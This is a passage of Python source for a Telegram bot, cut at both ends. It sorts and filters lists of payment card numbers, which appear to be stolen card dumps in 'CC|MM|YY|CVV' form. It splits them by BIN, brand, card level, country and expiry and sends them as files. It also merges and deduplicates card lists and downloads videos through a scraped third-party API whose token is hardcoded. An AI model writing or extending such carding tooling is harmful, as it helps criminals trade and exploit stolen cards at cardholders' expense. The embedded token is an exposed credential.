        cards_list = organized['by_brand'].get(brand, [])
        
        if not cards_list:
            await query.answer("No cards for this brand")
            return
        
        content = "\n".join([c['formatted'] for c in cards_list])
        file_bytes = content.encode('utf-8')
        await send_large_document(
            bot=query.message.get_bot(),
            chat_id=query.message.chat.id,
            content=file_bytes,
            filename=f"brand_{brand}_{len(cards_list)}.txt",
            caption=f"💳 Brand: {brand}\n📊 Cards: {len(cards_list)}"
        )
        return
    
    # By Type (lazy load BIN details)
    elif action == "f_type":
        _load_bin_details_lazy(organized)
        
        types = sorted(organized['by_type'].items(), key=lambda x: -len(x[1]))
        
        if not types:
            await query.answer("No type data available")
            return
        
        buttons = []
        for card_type, cards_list in types:
            emoji = "💳" if card_type == "CREDIT" else "💵" if card_type == "DEBIT" else "🎫"
            buttons.append([InlineKeyboardButton(
                f"{emoji} {card_type} ({len(cards_list)})",
                callback_data=f"f_gettype:{session_id}:{card_type}"
            )])
        
        buttons.append([back_btn()])
        
        await query.edit_message_text(
            "🔖 *By Card Type*\n\nTap to download:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    # Get specific type - use smart sender for large files
    elif action == "f_gettype":
        card_type = extra
        cards_list = organized['by_type'].get(card_type, [])
        
        if not cards_list:
            await query.answer("No cards for this type")
            return
        
        content = "\n".join([c['formatted'] for c in cards_list])
        file_bytes = content.encode('utf-8')
        await send_large_document(
            bot=query.message.get_bot(),
            chat_id=query.message.chat.id,
            content=file_bytes,
            filename=f"type_{card_type}_{len(cards_list)}.txt",
            caption=f"🔖 Type: {card_type}\n📊 Cards: {len(cards_list)}"
        )
        return
    
    # By Level (lazy load BIN details)
    elif action == "f_level":
        _load_bin_details_lazy(organized)
        
        levels = sorted(organized['by_level'].items(), key=lambda x: -len(x[1]))
        
        if not levels:
            await query.answer("No level data available")
            return
        
        buttons = []
        for level, cards_list in levels[:15]:
            buttons.append([InlineKeyboardButton(
                f"⭐ {level} ({len(cards_list)})",
                callback_data=f"f_getlevel:{session_id}:{level[:20]}"
            )])
        
        buttons.append([back_btn()])
        
        await query.edit_message_text(
            "⭐ *By Card Level*\n\nTap to download:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    # Get specific level - use smart sender for large files
    elif action == "f_getlevel":
        level = extra
        cards_list = organized['by_level'].get(level, [])
        
        if not cards_list:
            await query.answer("No cards for this level")
            return
        
        content = "\n".join([c['formatted'] for c in cards_list])
        file_bytes = content.encode('utf-8')
        await send_large_document(
            bot=query.message.get_bot(),
            chat_id=query.message.chat.id,
            content=file_bytes,
            filename=f"level_{level}_{len(cards_list)}.txt",
            caption=f"⭐ Level: {level}\n📊 Cards: {len(cards_list)}"
        )
        return
    
    # By Country (lazy load BIN details)
    elif action == "f_country":
        _load_bin_details_lazy(organized)
        
        countries = sorted(organized['by_country'].items(), key=lambda x: -len(x[1]))
        
        if not countries:
            await query.answer("No country data available")
            return
        
        buttons = []
        for country, cards_list in countries[:15]:
            # Use first 20 chars of country name for callback data
            country_short = country.replace(" ", "_")[:20]
            buttons.append([InlineKeyboardButton(
                f"{country} ({len(cards_list)})",
                callback_data=f"f_getcountry:{session_id}:{country_short}"
            )])
        
        buttons.append([back_btn()])
        
        await query.edit_message_text(
            "🌍 *By Country*\n\nTap to download:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    # Get specific country - use smart sender for large files
    elif action == "f_getcountry":
        country_short = extra.replace("_", " ") if extra else ""
        # Find matching country
        cards_list = []
        country_full = country_short
        for country, cl in organized['by_country'].items():
            if country.replace(" ", "_")[:20] == extra:
                cards_list = cl
                country_full = country
                break
        
        if not cards_list:
            await query.answer("No cards for this country")
            return
        
        content = "\n".join([c['formatted'] for c in cards_list])
        file_bytes = content.encode('utf-8')
        await send_large_document(
            bot=query.message.get_bot(),
            chat_id=query.message.chat.id,
            content=file_bytes,
            filename=f"country_{len(cards_list)}.txt",
            caption=f"🌍 Country: {country_full}\n📊 Cards: {len(cards_list)}"
        )
        return
    
    # By Year+Month
    elif action == "f_ym":
        # First show years to select
        years = sorted(organized['by_year'].keys())
        
        buttons = []
        row = []
        for yy in years:
            count = len(organized['by_year'][yy])
            row.append(InlineKeyboardButton(f"20{yy} ({count})", callback_data=f"f_ymyear:{session_id}:{yy}"))
            if len(row) == 3:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)
        
        buttons.append([back_btn()])
        
        await query.edit_message_text(
            "📅 *Year+Month Filter*\n\nFirst, select a year:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    # Year+Month - year selected, show months
    elif action == "f_ymyear":
        yy = extra
        month_names = ['', 'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
        
        # Get months for this year
        buttons = []
        row = []
        for mm in ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12']:
            ym_key = f"{yy}_{mm}"
            cards_list = organized['by_year_month'].get(ym_key, [])
            if cards_list:
                name = month_names[int(mm)]
                row.append(InlineKeyboardButton(
                    f"{name} ({len(cards_list)})",
                    callback_data=f"f_getym:{session_id}:{ym_key}"
                ))
                if len(row) == 3:
                    buttons.append(row)
                    row = []
        if row:
            buttons.append(row)
        
        if not buttons:
            await query.answer("No cards for this year")
            return
        
        buttons.append([InlineKeyboardButton("⬅️ Back to Years", callback_data=f"f_ym:{session_id}")])
        buttons.append([back_btn()])
        
        await query.edit_message_text(
            f"📅 *Year 20{yy}*\n\nSelect month:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    # Get specific year+month - use smart sender for large files
    elif action == "f_getym":
        ym_key = extra  # Format: "27_05"
        cards_list = organized['by_year_month'].get(ym_key, [])
        
        if not cards_list:
            await query.answer("No cards for this period")
            return
        
        yy, mm = ym_key.split("_")
        month_names = ['', 'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
        month_name = month_names[int(mm)] if int(mm) <= 12 else mm
        
        content = "\n".join([c['formatted'] for c in cards_list])
        file_bytes = content.encode('utf-8')
        await send_large_document(
            bot=query.message.get_bot(),
            chat_id=query.message.chat.id,
            content=file_bytes,
            filename=f"20{yy}_{month_name}_{len(cards_list)}.txt",
            caption=f"📅 Period: {month_name} 20{yy}\n📊 Cards: {len(cards_list)}"
        )
        return
    
    # Search BIN
    elif action == "f_search":
        context.user_data[f"filter_search_{query.from_user.id}"] = session_id
        
        await query.edit_message_text(
            "🔍 *BIN Search*\n\n"
            "Send a BIN (6 digits) to search:\n\n"
            "Example: `411111`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[back_btn()]])
        )
        return
    
    # Clear session
    elif action == "f_clear":
        if session_id in _filter_sessions:
            del _filter_sessions[session_id]
        await query.edit_message_text("🗑️ Session cleared.")
        return
    
    # Back to main menu
    elif action == "f_back":
        cards = organized['all']
        bins_count = len(organized['by_bin'])
        years = sorted(organized['by_year'].keys())
        months_count = len(organized['by_month'])
        
        buttons = [
            [InlineKeyboardButton("📥 Download All", callback_data=f"f_dl:{session_id}")],
            [
                InlineKeyboardButton(f"🏦 BIN ({bins_count})", callback_data=f"f_bin:{session_id}"),
                InlineKeyboardButton("💳 Brand", callback_data=f"f_brand:{session_id}")
            ],
            [
                InlineKeyboardButton("🔖 Type", callback_data=f"f_type:{session_id}"),
                InlineKeyboardButton("⭐ Level", callback_data=f"f_level:{session_id}")
            ],
            [
                InlineKeyboardButton("🌍 Country", callback_data=f"f_country:{session_id}"),
                InlineKeyboardButton("📅 Year+Month", callback_data=f"f_ym:{session_id}")
            ],
            [
                InlineKeyboardButton(f"📅 Month ({months_count})", callback_data=f"f_month:{session_id}"),
                InlineKeyboardButton(f"📆 Year ({len(years)})", callback_data=f"f_year:{session_id}")
            ],
            [
                InlineKeyboardButton("🔍 Search", callback_data=f"f_search:{session_id}"),
                InlineKeyboardButton("🗑️ Clear", callback_data=f"f_clear:{session_id}")
            ]
        ]
        
        await query.edit_message_text(
            f"✅ *Filter Results*\n\n"
            f"📊 Cards: `{len(cards):,}`\n"
            f"🏦 BINs: `{bins_count}`\n"
            f"📆 Years: `{', '.join(years)}`\n\n"
            f"👤 {_escape_md(session['user'])}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return

# ==== 13.6 /split Command - Split Large Files into Parts ====
async def split_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Split a large file into smaller parts that can be uploaded to Telegram.
    Usage: Reply to a file with /split [size_mb]
    Default split size: 15MB (safe for Telegram)
    """
    uid = update.effective_user.id
    
    # Check if message is a reply to a document
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text(
            "✂️ *File Splitter*\n\n"
            "*Usage:*\n"
            "1. Upload a large file to Telegram (up to 2GB)\n"
            "2. Reply to it with `/split [size_mb]`\n\n"
            "*Parameters:*\n"
            "• `size_mb` - Size of each part in MB (default: 15)\n\n"
            "*Examples:*\n"
            "• `/split` - Split into 15MB parts\n"
            "• `/split 10` - Split into 10MB parts\n"
            "• `/split 5` - Split into 5MB parts\n\n"
            "*Note:* This is useful when you have files >20MB but want to use\n"
            "Telegram file upload with /sort, /clean, /filter commands.",
            parse_mode="Markdown",
            reply_to_message_id=update.message.message_id
        )
        return
    
    # Get split size from args
    split_size_mb = 15  # Default 15MB
    if context.args:
        try:
            split_size_mb = int(context.args[0])
            if split_size_mb < 1:
                split_size_mb = 1
            elif split_size_mb > 50:
                split_size_mb = 50  # Max 50MB per part
        except:
            pass
    
    split_size = split_size_mb * 1024 * 1024  # Convert to bytes
    
    replied_msg = update.message.reply_to_message
    doc = replied_msg.document
    file_size = doc.file_size
    file_size_mb = file_size / (1024 * 1024)
    file_name = doc.file_name or "file"
    
    # Check if splitting is needed
    if file_size <= split_size:
        await update.message.reply_text(
            f"ℹ️ File is only {file_size_mb:.1f}MB, no splitting needed.\n"
            f"You can use it directly with /sort, /clean, or /filter.",
            reply_to_message_id=update.message.message_id
        )
        return
    
    num_parts = (file_size + split_size - 1) // split_size
    
    status_msg = await update.message.reply_text(
        f"✂️ Splitting file...\n\n"
        f"📁 File: {file_name}\n"
        f"📊 Size: {file_size_mb:.1f}MB\n"
        f"📦 Parts: {num_parts} × {split_size_mb}MB",
        reply_to_message_id=update.message.message_id
    )
    
    try:
        # Download the file
        await status_msg.edit_text(f"📥 Downloading {file_name}...")
        
        file = await context.bot.get_file(doc.file_id)
        file_bytes = await file.download_as_bytearray()
        
        await status_msg.edit_text(f"✂️ Splitting into {num_parts} parts...")
        
        # Split and send parts
        base_name = file_name.rsplit('.', 1)[0] if '.' in file_name else file_name
        extension = '.' + file_name.rsplit('.', 1)[1] if '.' in file_name else '.txt'
        
        for i in range(num_parts):
            start = i * split_size
            end = min((i + 1) * split_size, len(file_bytes))
            part_data = file_bytes[start:end]
            part_size_mb = len(part_data) / (1024 * 1024)
            
            part_name = f"{base_name}_part{i+1}of{num_parts}{extension}"
            
            await update.message.reply_document(
                document=BytesIO(bytes(part_data)),
                filename=part_name,
                caption=f"📦 Part {i+1}/{num_parts} ({part_size_mb:.1f}MB)\n"
                        f"Use with /sort, /clean, or /filter"
            )
        
        await status_msg.edit_text(
            f"✅ Split complete!\n\n"
            f"📁 Original: {file_name} ({file_size_mb:.1f}MB)\n"
            f"📦 Created: {num_parts} parts × {split_size_mb}MB each\n\n"
            f"💡 Reply to each part with /sort, /clean, or /filter"
        )
        
    except Exception as e:
        error_msg = str(e)
        if "too big" in error_msg.lower():
            await status_msg.edit_text(
                "⚠️ File too large to download via Telegram Bot API.\n\n"
                "🌐 *Alternative:* Use URL-based processing:\n"
                "1. Upload file to transfer.sh, file.io, etc.\n"
                "2. Use: `/sort <URL>` or `/clean <URL>` or `/filter <URL>`",
                parse_mode="Markdown"
            )
        else:
            await status_msg.edit_text(f"❌ Error: {error_msg[:100]}")

# ==== 13.7 /jork Command - Video Downloader (Any Size, High Quality) ====
_JORK_BASE_URL = "https://www.xoffline.com"
_JORK_API_URL = f"{_JORK_BASE_URL}/callDownloaderApi"
_JORK_API_TOKEN = "3c409435f781890e402cdf7312aa47f2a7e23594f5615ce524f8e711bc69acc5"
_JORK_MAX_VIDEO_SIZE = 2000 * 1024 * 1024  # 2GB - Telegram document limit

def _fetch_video_info(video_url: str) -> dict:
    """
    Fetch video download info from xoffline.com API.
    Returns dict with title, thumbnail, quality, url.
    """
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Referer": _JORK_BASE_URL + "/",
    })
    
    # Get session tokens
    try:
        session.get(_JORK_BASE_URL + "/", timeout=60)
    except Exception as e:
        raise RuntimeError(f"Failed to connect to server: {str(e)[:50]}")
    
    csrf = session.cookies.get("x-csrf-token")
    sid = session.cookies.get("connect.sid")
    
    if not csrf or not sid:
        raise RuntimeError("Failed to get session tokens")
    
    # Make API request
    headers = {
        "Content-Type": "application/json",
        "Origin": _JORK_BASE_URL,
        "X-CSRF-Token": csrf,
    }
    
    payload = {
        "apiToken": _JORK_API_TOKEN,
        "apiValue": video_url,
    }
    
    try:
        r = session.post(_JORK_API_URL, headers=headers, json=payload, timeout=600)
        r.raise_for_status()
    except requests.exceptions.Timeout:
        raise RuntimeError("Request timed out")
    except requests.exceptions.HTTPError as e:
        raise RuntimeError(f"HTTP error: {e.response.status_code}")
    except Exception as e:
        raise RuntimeError(f"Request failed: {str(e)[:50]}")
    
    try:
        data = r.json()
        if "data" not in data or not data["data"]:
            raise RuntimeError("No data returned from API")
        
        video_data = data["data"][0]
        
        final_url = video_data.get("url", "")
        if final_url.startswith("https://href.li/?"):
            final_url = final_url.replace("https://href.li/?", "", 1)
        
        return {
            "title": video_data.get("title", "Unknown Title"),
            "thumbnail": video_data.get("thumbnail", ""),
            "quality": video_data.get("quality", "Unknown"),
            "url": final_url,
        }
    except KeyError:
        raise RuntimeError("Invalid API response format")
    except Exception as e:
        raise RuntimeError(f"Failed to parse response: {str(e)[:50]}")

def _download_video_unlimited(download_url: str) -> tuple:
    """
    Download video file from URL - NO SIZE LIMIT (up to 2GB for Telegram documents).
    Returns: (video_bytes, file_size, content_length, error_msg)
    """
    try:
        session = get_http_session()
        
        # Check file size with HEAD request
        content_length = 0
        try:
            head = session.head(download_url, timeout=10, allow_redirects=True)
            content_length = int(head.headers.get('content-length', 0))
            if content_length > _JORK_MAX_VIDEO_SIZE:
                return None, 0, content_length, f"Video too large ({content_length // (1024*1024)}MB). Max: 2GB"
        except:
            pass  # Unknown size, proceed anyway
        
        # Download the video with streaming
        response = session.get(download_url, stream=True, timeout=600)  # 10 min timeout for large files
        response.raise_for_status()
        
        chunks = []
        downloaded = 0
        
        for chunk in response.iter_content(chunk_size=2 * 1024 * 1024):  # 2MB chunks for speed
            if chunk:
                chunks.append(chunk)
                downloaded += len(chunk)
                
                if downloaded > _JORK_MAX_VIDEO_SIZE:
                    return None, downloaded, content_length, f"Video exceeds 2GB limit"
        
        video_bytes = b''.join(chunks)
        return video_bytes, len(video_bytes), content_length, None
        
    except requests.exceptions.Timeout:
        return None, 0, 0, "Download timed out (try a smaller video)"
    except requests.exceptions.HTTPError as e:
        return None, 0, 0, f"HTTP error: {e.response.status_code}"
    except Exception as e:
        return None, 0, 0, f"Download failed: {str(e)[:50]}"

async def jork_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /jork <video_url> - Download video and send to user (any size, high quality)
    Sends as document for max quality, always includes manual download link.
    """
    uid = update.effective_user.id
    uname = update.effective_user.first_name or "User"
    
    # Get the URL from command arguments
    if not context.args:
        await update.message.reply_text(
            "🎬 <b>Video Downloader</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/jork &lt;video_url&gt;</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/jork https://example.com/video</code>\n\n"
            "<b>Features:</b>\n"
            "• Downloads any size video (up to 2GB)\n"
            "• Highest quality available\n"
            "• Sends as file for best quality\n"
            "• Always includes manual download link",
            parse_mode="HTML",
            reply_to_message_id=update.message.message_id
        )
        return
    
    video_url = context.args[0].strip()
    
    # Basic URL validation
    if not video_url.startswith(("http://", "https://")):
        await update.message.reply_text(
            "❌ Invalid URL. Please provide a valid video URL starting with http:// or https://",
            reply_to_message_id=update.message.message_id
        )
        return
    
    # Send processing message
    wait_msg = await update.message.reply_text(
        "⏳ Processing your link...",
        reply_to_message_id=update.message.message_id
    )
    
    try:
        # Step 1: Fetch video info
        loop = asyncio.get_running_loop()
        info = await loop.run_in_executor(_executor, _fetch_video_info, video_url)
        
        title = info.get("title", "Unknown")
        quality = info.get("quality", "Unknown")
        download_url = info.get("url", "")
        thumbnail = info.get("thumbnail", "")
        
        if not download_url:
            await wait_msg.edit_text("❌ Failed to get download URL.")
            return
        
        title_safe = title.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        
        # Step 2: Update status and download the video
        await wait_msg.edit_text(
            f"📥 Downloading video...\n\n"
            f"<b>{title_safe[:50]}{'...' if len(title) > 50 else ''}</b>\n"
            f"🎞 Quality: {quality}\n\n"
            f"<i>This may take a while for large files...</i>",
            parse_mode="HTML"
        )
        
        video_bytes, file_size, content_length, error = await loop.run_in_executor(
            _executor, _download_video_unlimited, download_url
        )
        
        if error:
            # Download failed - send thumbnail with link
            fallback_caption = (
                f"<b>{title_safe}</b>\n\n"
                f"🎞 Quality: <b>{quality}</b>\n"
            )
            if content_length > 0:
                fallback_caption += f"📦 Size: <b>{content_length // (1024*1024)}MB</b>\n"
            fallback_caption += (
                f"\n⚠️ {error}\n\n"
                f"⬇️ <a href='{download_url}'>Download MP4 manually</a>"
            )
            
            try:
                await wait_msg.delete()
            except:
                pass
            
            if thumbnail:
                try:
                    await update.message.reply_photo(
                        photo=thumbnail,
                        caption=fallback_caption,
                        parse_mode="HTML",
                        reply_to_message_id=update.message.message_id
                    )
                except:
                    await update.message.reply_text(
                        fallback_caption,
                        parse_mode="HTML",
                        reply_to_message_id=update.message.message_id,
                        disable_web_page_preview=False
                    )
            else:
                await update.message.reply_text(
                    fallback_caption,
                    parse_mode="HTML",
                    reply_to_message_id=update.message.message_id,
                    disable_web_page_preview=False
                )
            return
        
        # Step 3: Prepare upload
        file_size_mb = file_size / (1024 * 1024)
        
        # Caption with download link included
        video_caption = (
            f"<b>{title_safe}</b>\n\n"
            f"🎞 Quality: <b>{quality}</b>\n"
            f"📦 Size: <b>{file_size_mb:.1f}MB</b>\n\n"
            f"⬇️ <a href='{download_url}'>Manual Download</a>"
        )
        
        # Create filename from title (sanitize)
        safe_title = re.sub(r'[^\w\s-]', '', title)[:50].strip()
        if not safe_title:
            safe_title = "video"
        filename = f"{safe_title}.mp4"
        
        # Write to temp file for upload
        temp_path = f"/tmp/jork_{uid}_{int(time.time())}.mp4"
        
        # For files > 50MB, try Pyrogram (MTProto) which supports up to 2GB
        if file_size_mb > 50:
            await wait_msg.edit_text(
                f"📤 Uploading large file ({file_size_mb:.1f}MB)...\n\n"
                f"<i>Using MTProto for large file upload...</i>",
                parse_mode="HTML"
            )
            
            # Write to temp file
            try:
                with open(temp_path, 'wb') as f:
                    f.write(video_bytes)
                del video_bytes
                gc.collect()
            except Exception as e:
                await wait_msg.edit_text(f"❌ Failed to save video: {str(e)[:50]}")
                return
            
            # Try Pyrogram upload
            pyrogram_caption = (
                f"<b>{title_safe}</b>\n\n"
                f"🎞 Quality: <b>{quality}</b>\n"
                f"📦 Size: <b>{file_size_mb:.1f}MB</b>\n\n"
                f"⬇️ <a href='{download_url}'>Manual Download</a>"
            )
            
            pyrogram_success = False
            if _pyrogram_available:
                try:
                    await wait_msg.edit_text(
                        f"📤 Uploading {file_size_mb:.1f}MB via MTProto...\n\n"
                        f"<i>This may take several minutes...</i>",
                        parse_mode="HTML"
                    )
                    pyrogram_success = await _upload_large_file_pyrogram(
                        chat_id=update.effective_chat.id,
                        file_path=temp_path,
                        caption=pyrogram_caption,
                        reply_to=update.message.message_id
                    )
                except Exception as e:
                    print(f"Pyrogram upload failed: {e}")
            
            # Clean up temp file
            try:
                os.remove(temp_path)
            except:
                pass
            
            if pyrogram_success:
                try:
                    await wait_msg.delete()
                except:
                    pass
                gc.collect()
                return
            
            # Pyrogram failed or not available - send download link
            try:
                await wait_msg.delete()
            except:
                pass
            
            # Check if Pyrogram is configured
            if not _pyrogram_available:
                no_pyro_msg = "\n\n💡 <i>To enable large uploads, install pyrogram and set API_ID + API_HASH</i>"
            else:
                no_pyro_msg = ""
            
            large_file_caption = (
                f"<b>{title_safe}</b>\n\n"
                f"🎞 Quality: <b>{quality}</b>\n"
                f"📦 Size: <b>{file_size_mb:.1f}MB</b>\n\n"
                f"⬇️ <a href='{download_url}'>Click here to download</a>"
                f"{no_pyro_msg}"
            )
            
            if thumbnail:
                try:
                    await update.message.reply_photo(
                        photo=thumbnail,
                        caption=large_file_caption,
                        parse_mode="HTML",
                        reply_to_message_id=update.message.message_id
                    )
                except:
                    await update.message.reply_text(
                        large_file_caption,
                        parse_mode="HTML",
                        reply_to_message_id=update.message.message_id,
                        disable_web_page_preview=False
                    )
            else:
                await update.message.reply_text(
                    large_file_caption,
                    parse_mode="HTML",
                    reply_to_message_id=update.message.message_id,
                    disable_web_page_preview=False
                )
            gc.collect()
            return
        
        # File is under 50MB - use standard Bot API
        await wait_msg.edit_text(
            f"📤 Uploading to Telegram ({file_size_mb:.1f}MB)...\n\n"
            f"<i>Please wait...</i>",
            parse_mode="HTML"
        )
        try:
            with open(temp_path, 'wb') as f:
                f.write(video_bytes)
            
            # Free memory before upload
            del video_bytes
            gc.collect()
            
            try:
                await wait_msg.delete()
            except:
                pass
            
            upload_success = False
            last_error = ""
            
            # Try VIDEO (media) first - better preview in chat
            for attempt in range(2):
                try:
                    with open(temp_path, 'rb') as video_file:
                        await update.message.reply_video(
                            video=video_file,
                            filename=filename,
                            caption=video_caption,
                            parse_mode="HTML",
                            reply_to_message_id=update.message.message_id,
                            supports_streaming=True,
                            read_timeout=120,
                            write_timeout=120,
                            connect_timeout=30
                        )
                    upload_success = True
                    break
                except Exception as e:
                    last_error = str(e)
                    if attempt < 1:
                        await asyncio.sleep(1)
                    continue
            
            # If video fails, try as document
            if not upload_success:
                for attempt in range(2):
                    try:
                        with open(temp_path, 'rb') as video_file:
                            await update.message.reply_document(
                                document=video_file,
                                filename=filename,
                                caption=video_caption,
                                parse_mode="HTML",
                                reply_to_message_id=update.message.message_id,
                                read_timeout=120,
                                write_timeout=120,
                                connect_timeout=30
                            )
                        upload_success = True
                        break
                    except Exception as e:
                        last_error = str(e)
                        if attempt < 1:
                            await asyncio.sleep(1)
                        continue
            
            if not upload_success:
                # Send thumbnail with link as fallback
                if thumbnail:
                    try:
                        await update.message.reply_photo(
                            photo=thumbnail,
                            caption=f"{video_caption}\n\n⚠️ <i>Upload failed - use link above</i>",
                            parse_mode="HTML",
                            reply_to_message_id=update.message.message_id
                        )
                    except:
                        await update.message.reply_text(
                            f"{video_caption}\n\n⚠️ Upload failed: {last_error[:40]}",
                            parse_mode="HTML",
                            reply_to_message_id=update.message.message_id,
                            disable_web_page_preview=False
                        )
                else:
                    await update.message.reply_text(
                        f"{video_caption}\n\n⚠️ Upload failed: {last_error[:40]}",
                        parse_mode="HTML",
                        reply_to_message_id=update.message.message_id,
                        disable_web_page_preview=False
                    )
        
        finally:
            # Clean up temp file
            try:
                if os.path.exists(temp_path):
                    os.remove(temp_path)
            except:
                pass
            gc.collect()
        
    except RuntimeError as e:
        try:
            await wait_msg.edit_text(
                f"❌ Failed to process video.\n\n<i>{str(e)}</i>\n\nTry again later.",
                parse_mode="HTML"
            )
        except:
            pass
    except Exception as e:
        error_msg = str(e)[:100] if str(e) else "Unknown error"
        try:
            await wait_msg.edit_text(
                f"❌ Failed to process video.\n\n<i>{error_msg}</i>\n\nTry again later.",
                parse_mode="HTML"
            )
        except:
            pass

# ==== 13.8 /merge Command - Merge Multiple Files into One ====
async def merge_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /merge - Merge multiple text files into one clean sorted file.
    Reply to multiple forwarded files or use in a conversation.
    """
    uid = update.effective_user.id
    uname = update.effective_user.first_name or "User"
    
    # Check if replying to a message with document
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        # Check if user has pending merge session
        merge_key = f"merge_{uid}"
        
        if merge_key in context.user_data and context.user_data[merge_key].get('files'):
            # User has files, show options
            files = context.user_data[merge_key]['files']
            keyboard = [
                [InlineKeyboardButton(f"✅ Merge {len(files)} files", callback_data=f"merge_now:{uid}")],
                [InlineKeyboardButton("➕ Add more files", callback_data=f"merge_add:{uid}")],
                [InlineKeyboardButton("🗑️ Clear & start over", callback_data=f"merge_clear:{uid}")]
            ]
            
            await update.message.reply_text(
                f"📎 <b>Merge Session</b>\n\n"
                f"Files added: <b>{len(files)}</b>\n"
                f"Total lines: <b>{sum(f['lines'] for f in files):,}</b>\n\n"
                f"Reply to more files with /merge to add them,\n"
                f"or tap a button below:",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(keyboard),
                reply_to_message_id=update.message.message_id
            )
            return
        
        # Show usage
        await update.message.reply_text(
            "📎 <b>File Merger</b>\n\n"
            "<b>Usage:</b>\n"
            "1. Forward/upload multiple .txt files\n"
            "2. Reply to each file with /merge to add it\n"
            "3. When done, use /merge to merge all\n\n"
            "<b>Features:</b>\n"
            "• Merges multiple text files into one\n"
            "• Removes duplicates\n"
            "• Sorts lines (by BIN if cards detected)\n"
            "• Cleans empty lines\n\n"
            "<b>Example:</b>\n"
            "1. Reply to file1.txt with /merge\n"
            "2. Reply to file2.txt with /merge\n"
            "3. Send /merge to combine them",
            parse_mode="HTML",
            reply_to_message_id=update.message.message_id
        )
        return
    
    # User is replying to a document - add it to merge session
    doc = update.message.reply_to_message.document
    file_name = doc.file_name or "file.txt"
    file_size = doc.file_size
    file_size_mb = file_size / (1024 * 1024)
    
    # Check file size
    if file_size > 20 * 1024 * 1024:
        await update.message.reply_text(
            f"⚠️ File too large: {file_size_mb:.1f}MB\n"
            f"Max file size: 20MB per file",
            reply_to_message_id=update.message.message_id
        )
        return
    
    status_msg = await update.message.reply_text(
        f"📥 Adding {file_name}...",
        reply_to_message_id=update.message.message_id
    )
    
    try:
        # Download file
        file = await context.bot.get_file(doc.file_id)
        file_bytes = await file.download_as_bytearray()
        
        # Decode
        content = ""
        for encoding in ['utf-8', 'latin-1', 'cp1252']:
            try:
                content = file_bytes.decode(encoding)
                break
            except:
                continue
        if not content:
            content = file_bytes.decode('utf-8', errors='ignore')
        
        lines = [l.strip() for l in content.split('\n') if l.strip()]
        
        # Initialize or get merge session
        merge_key = f"merge_{uid}"
        if merge_key not in context.user_data:
            context.user_data[merge_key] = {'files': [], 'created': time.time()}
        
        # Add file to session
        context.user_data[merge_key]['files'].append({
            'name': file_name,
            'lines': len(lines),
            'content': lines
        })
        
        total_files = len(context.user_data[merge_key]['files'])
        total_lines = sum(f['lines'] for f in context.user_data[merge_key]['files'])
        
        keyboard = [
            [InlineKeyboardButton(f"✅ Merge {total_files} files now", callback_data=f"merge_now:{uid}")],
            [InlineKeyboardButton("🗑️ Clear all", callback_data=f"merge_clear:{uid}")]
        ]
        
        await status_msg.edit_text(
            f"✅ <b>Added:</b> {file_name}\n"
            f"📄 Lines: {len(lines):,}\n\n"
            f"<b>Session total:</b>\n"
            f"• Files: {total_files}\n"
            f"• Lines: {total_lines:,}\n\n"
            f"Reply to more files with /merge,\n"
            f"or tap the button to merge now:",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
    except Exception as e:
        await status_msg.edit_text(f"❌ Error: {str(e)[:100]}")

async def merge_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle merge command callbacks"""
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    data = query.data
    if not data.startswith("merge_"):
        return
    
    parts = data.split(":")
    action = parts[0]
    uid = int(parts[1]) if len(parts) > 1 else 0
    
    # Verify user
    if query.from_user.id != uid:
        await query.answer("This is not your session!", show_alert=True)
        return
    
    merge_key = f"merge_{uid}"
    
    if action == "merge_clear":
        if merge_key in context.user_data:
            del context.user_data[merge_key]
        await query.edit_message_text("🗑️ Merge session cleared.")
        return
    
    if action == "merge_add":
        await query.edit_message_text(
            "📎 Reply to a .txt file with /merge to add it to the session."
        )
        return
    
    if action == "merge_now":
        if merge_key not in context.user_data or not context.user_data[merge_key].get('files'):
            await query.edit_message_text("❌ No files to merge. Add files first.")
            return
        
        files = context.user_data[merge_key]['files']
        
        await query.edit_message_text(
            f"🔄 Merging {len(files)} files...\n"
            f"• Removing duplicates\n"
            f"• Sorting lines\n"
            f"• Cleaning data..."
        )
        
        # Merge all lines
        all_lines = []
        for f in files:
            all_lines.extend(f['content'])
        
        original_count = len(all_lines)
        
        # Remove duplicates while preserving order
        seen = set()
        unique_lines = []
        for line in all_lines:
            if line not in seen:
                seen.add(line)
                unique_lines.append(line)
        
        duplicates_removed = original_count - len(unique_lines)
        
        # Check if lines look like cards (CC|MM|YY|CVV format)
        card_pattern = re.compile(r'^\d{13,19}\|')
        cards_detected = sum(1 for l in unique_lines[:100] if card_pattern.match(l))
        
        if cards_detected > 50:  # More than 50% look like cards
